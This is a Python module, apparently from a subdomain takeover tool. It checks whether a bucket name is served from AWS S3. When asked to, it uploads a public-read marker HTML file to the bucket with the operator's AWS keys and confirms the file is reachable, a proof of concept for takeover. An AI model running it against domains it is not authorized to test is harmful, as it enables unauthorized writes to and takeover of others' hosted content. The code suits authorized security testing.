from cStringIO import StringIO
import requests
import colorama 
import boto3
from urllib3.exceptions import InsecureRequestWarning 
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



upload_name = 'domainker_aws_poc.html'
upload_body = """<html>
<!-- TAKE_OVER_DONE -->
</html>"""

def tkaws(bucket):
	session = boto3.Session(
	    aws_access_key_id="XXXXXXXXXXXXXXXXXXXXXXXXX", # Your aws key
	    aws_secret_access_key="XXXXXXXXXXXXXXXXXXXXX", # Your aws key
	)

	s3 = session.client('s3')
	
	try:
		s3.put_object(Bucket=bucket, Key=upload_name,ACL='public-read', Body=StringIO(upload_body).read())
		response = requests.get("http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name)).content
		if upload_body in response:
			return "%sFile uploaded and accessable%s -%s>%s %s" %(colorama.Fore.GREEN,colorama.Fore.RESET,colorama.Fore.YELLOW,colorama.Fore.RESET,("http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name)))
		else:
			return "%sFile uploaded and not accessable%s" %(colorama.Fore.BLUE,colorama.Fore.RESET)

	except Exception as e:
		if "Access Denied" in str(e):
			return "%sAccess Denied%s" %(colorama.Fore.RED,colorama.Fore.RESET)
		else:
			return e



def ckaws(bucket,takeover,timeout=60):
	try:
		aws = requests.get("http://%s.s3.amazonaws.com" % bucket,timeout=timeout)
		if aws.status_code == 404:
			return '%sNot hosted on AWS%s' % (colorama.Fore.RED,colorama.Fore.RESET)
		
		if takeover:
			return tkaws(bucket)
		else:
			return '%sHosted on AWS %s-> %s%s%s' % (colorama.Fore.GREEN,colorama.Fore.YELLOW,colorama.Fore.LIGHTWHITE_EX,"http://%s.s3.amazonaws.com" % bucket,colorama.Fore.RESET)

	except Exception as e:
		pass
